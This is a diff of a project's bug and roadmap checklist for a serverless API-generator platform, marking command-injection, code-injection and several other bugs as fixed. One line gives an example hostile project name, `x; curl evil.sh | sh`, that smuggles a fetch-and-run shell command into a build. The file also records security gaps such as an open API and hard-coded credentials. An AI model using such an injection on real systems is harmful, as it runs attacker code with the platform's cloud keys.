@@ -9,8 +9,8 @@ Tests currently **document** the existing behaviour for the bugs below; fixing a
 
 - [ ] **No authentication or authorization on the API.** No function in `backend-service/serverless.yml` has an authorizer, and CORS is `*`. Anyone who knows the URL can list, edit and delete projects. `DELETE /project/{id}` also tears down the project's CloudFormation stack and empties its S3 buckets.
 - [ ] **The login is fake.** `frontend-service/src/Login/action.ts:8` compares against hard-coded `admin` / `password` in the browser. It protects nothing, because the API is open (see above).
-- [ ] **Command injection into CodeBuild.** The project name is interpolated unescaped into a shell command in the buildspec (`node ./docs.js -p ${projectName}`, `deploymentEvent.ts:118`). A project named e.g. `x; curl evil.sh | sh` runs arbitrary commands inside a build that holds the platform's AWS keys. The project name is only validated as `min(3)` (`project.dto.ts`).
-- [ ] **Code and template injection through model metadata.** Model names, property names and types, and relations are pasted into generated TypeScript (function names, bodies, JSDoc) and `serverless.yml` (`codeBuilder.ts`, `modelEvent.ts`). Names are only validated as `min(3)` and property names/types not at all, so a crafted name can inject code into the deployed service. Restrict names to identifier-safe characters (e.g. `/^[A-Za-z][A-Za-z0-9]*$/`) and types to an enum.
+- [x] **Command injection into CodeBuild.** The project name is interpolated unescaped into a shell command in the buildspec (`node ./docs.js -p ${projectName}`, `deploymentEvent.ts:118`). A project named e.g. `x; curl evil.sh | sh` runs arbitrary commands inside a build that holds the platform's AWS keys. The project name is only validated as `min(3)` (`project.dto.ts`). Fixed: the name reaches the build as the `PROJECT_NAME` environment variable (`"$PROJECT_NAME"` in the buildspec), project names must match the new rule (`src/utils/names.ts`), and deploys refuse projects saved under the old rules.
+- [x] **Code and template injection through model metadata.** Model names, property names and types, and relations are pasted into generated TypeScript (function names, bodies, JSDoc) and `serverless.yml` (`codeBuilder.ts`, `modelEvent.ts`). Names are only validated as `min(3)` and property names/types not at all, so a crafted name can inject code into the deployed service. Restrict names to identifier-safe characters (e.g. `/^[A-Za-z][A-Za-z0-9]*$/`) and types to an enum. Fixed: models must be PascalCase, fields camelCase, types `string`/`number`/`boolean` (`src/utils/names.ts`); `SetupAPIFunction` refuses unsafe models and deploys refuse models saved under the old rules.
 - [ ] **Static AWS credentials are spread around.** `AWS_KEY`/`AWS_SECRET` are plain Lambda environment variables used in place of the execution role. They are also written into the CodeBuild `buildspecOverride` `env.variables` (`deploymentEvent.ts:103`), where anyone with `codebuild:BatchGetBuilds` can read them in the build definition. Use IAM roles (the Lambda execution role, plus a CodeBuild service role) and drop the keys.
 - [ ] **The control-plane IAM role is `Action: "*"`, `Resource: "*"`** (`serverless.yml:34`). Scope it to the tables, buckets, Lambda, CodeBuild, CloudFormation and Cost Explorer calls actually used.
 
@@ -30,8 +30,8 @@ Tests currently **document** the existing behaviour for the bugs below; fixing a
 - [ ] **`deleteFolder` deletes the wrong zip** for a prefix ending in `/`: `prefix.substring(0, prefix.indexOf("/") - 1)` drops the last character (`proj/` becomes `pro.zip`) (`S3Client.ts:119`). It also only deletes the first 1,000 objects (no pagination).
 - [ ] **Name and id collisions.**
   - `getServiceName`/`getTableName` keep only the last 6 hex chars of the project id (`substring(26)`). Service, stack and table names can collide between projects; a 50% chance at about 5k projects.
-  - `getTableName` only removes the first space (`replace(" ", "")`).
-  - The duplicate-model check is case-sensitive, so `User` and `user` map to the same table.
+  - ~~`getTableName` only removes the first space (`replace(" ", "")`).~~ Fixed: it removes every space.
+  - ~~The duplicate-model check is case-sensitive, so `User` and `user` map to the same table.~~ Fixed: model and field duplicate checks are case-insensitive, including renames in `PutModel`.
 - [ ] **Stale files can be redeployed.** `deploymentTriggeredHandler` downloads into a fixed `/tmp/.downloads/<projectId>` that is never cleaned. Warm Lambdas re-zip files deleted from S3 since the last deploy, and `/tmp` fills up over time.
 - [ ] **Stream leaks and crashes in `deploymentEvent.ts`.**
   - `downloadSourceCode` opens a write stream before checking for a null S3 body; it leaves an empty file and an open file handle (`:188`).
@@ -51,7 +51,7 @@ Tests currently **document** the existing behaviour for the bugs below; fixing a
 ## Frontend bugs
 
 - [ ] **Stale relationships are never removed.** `relToDelete` is never filled: `editRelationship` only records the old relation when `field == "relatedModel"`, but the selects only edit `modelId` and `relationship` (`modelManager.tsx:210`). The cleanup PUT in `pushModelUpdate` therefore never runs. These paths are excluded from coverage with `v8 ignore` hints until they're fixed.
-- [ ] **Cancel buttons submit their forms.** In the "New Project" and "Edit Project" dialogs (`Projects.tsx:62`, `ProjectCard.tsx:99`), the Cancel buttons have no `type="button"`, so clicking Cancel also submits the form (an edit is sent with no `action`).
+- [x] **Cancel buttons submit their forms.** In the "New Project" and "Edit Project" dialogs (`Projects.tsx:62`, `ProjectCard.tsx:99`), the Cancel buttons have no `type="button"`, so clicking Cancel also submits the form (an edit is sent with no `action`). Fixed: both are `type="button"`.
 - [ ] **Loader errors crash the page.** On network errors the loaders call `alert()` and return `undefined` (`Project/loader.ts:11`, `ProjectDetail/loader.ts:28`). The pages then destructure `undefined` from `useLoaderData()` and crash. Throw, and use an `errorElement`.
 - [x] **The API base URL is hard-coded to a staging endpoint** in every loader, action and `modelManager.tsx`. Moved to `VITE_API_URL` (`src/config.ts`).
 - [ ] **Cost cards never show.** `ProjectDetails` renders cost cards from `bill`, but the loader's cost fetch is commented out (`ProjectDetail/loader.ts:16-19`).
@@ -114,7 +114,7 @@ These are shown in the Figma designs (`figma-screenshot/`, reviewed 2026-10-19) 
 
 ### New project and Delete project modals
 
-- [ ] **Project name rule:** lowercase letters, numbers and hyphens, 3+ characters, enforced in `CreateProjectDtoSchema` as well as the UI. This also closes the command-injection item above. BE + FE
+- [x] **Project name rule:** lowercase letters, numbers and hyphens, 3+ characters, enforced in `CreateProjectDtoSchema` as well as the UI. This also closes the command-injection item above. BE + FE
 - [ ] **Per-project AWS region** ("AWS Deployment Region"). Today one global `AWS_DEPLOY_REGION` (default `eu-west-1`) applies to every project. BE + FE
 - [ ] **Type-to-confirm delete** with an impact summary: data loss, infrastructure, billing stops. BE should report what will be removed (tables, functions, buckets). FE, plus BE for the summary
 
@@ -129,7 +129,7 @@ These are shown in the Figma designs (`figma-screenshot/`, reviewed 2026-10-19) 
 ### Data Model Editor
 
 - [ ] **Enforce "required" in generated APIs.** The flag is only written into the API docs. Generated `Post`/`Put` handlers in `boilerplate/src/indexTemplate.ts` don't validate the body. BE (boilerplate + codeBuilder)
-- [ ] **Validate model and field names** as identifier-safe (e.g. PascalCase models, camelCase fields). This also closes the code-injection item above. BE + FE
+- [x] **Validate model and field names** as identifier-safe (e.g. PascalCase models, camelCase fields). This also closes the code-injection item above. BE + FE
 - [ ] **Save a model in one atomic call.** The UI shows one Save, but `pushModelUpdate` makes 3–4 separate requests (model, APIs, relations, relation deletes) that can partially fail. BE + FE
 - [ ] **Entity-relationship diagram** of all models, with pan, zoom and expand. FE
 - [ ] **Unsaved-changes tracking:** a dot per model, and a sticky footer with Discard and Save that is disabled while errors exist. FE
